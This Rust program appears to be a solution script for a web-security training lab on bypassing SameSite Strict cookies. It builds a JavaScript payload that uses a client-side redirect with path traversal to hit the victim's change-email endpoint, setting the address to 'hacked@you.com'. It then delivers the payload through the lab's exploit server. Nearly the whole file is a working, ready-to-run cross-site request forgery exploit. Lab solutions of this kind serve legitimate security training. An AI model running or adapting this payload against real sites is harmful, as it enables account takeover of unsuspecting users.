/*********************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 24/10/2023
*
* Lab: SameSite Strict bypass via client-side redirect
*
* Steps: 1. Exploit the redirection functionality that occurs after a comment is submitted
*           in order to redirect the victim to their profile and change their email using
*           URL parameters
*        2. Deliver the exploit to the victim
*        3. The victim's email will be changed after they trigger the exploit
*
**********************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let lab_url = "https://0af4002c03adc60580ab8b6b000f0048.web-security-academy.net";

    // change this to your exploit server URL
    let exploit_server_url = "https://exploit-0a6a000c038ec6b980208a9a011900a2.exploit-server.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // the header of your exploit sever response
    let exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";

    // the new email
    // you can change this to what you want
    let new_email = "hacked@you.com";

    // payload to change the victim's email
    let payload = format!(
        r###"<script>
                location = "{lab_url}/post/comment/confirmation?postId=../my-account/change-email%3femail={new_email}%26submit=1"
            </script>    
      "###
    );

    print!("{}", "❯❯ Delivering the exploit to the victim.. ".white(),);
    io::stdout().flush();

    // deliver the exploit to the victim
    client
        .post(exploit_server_url)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", exploit_server_head),
            ("responseBody", &payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to deliver the exploit to the victim".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{}",
        "🗹 The victim's email will be changed after they trigger the exploit".white()
    );
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
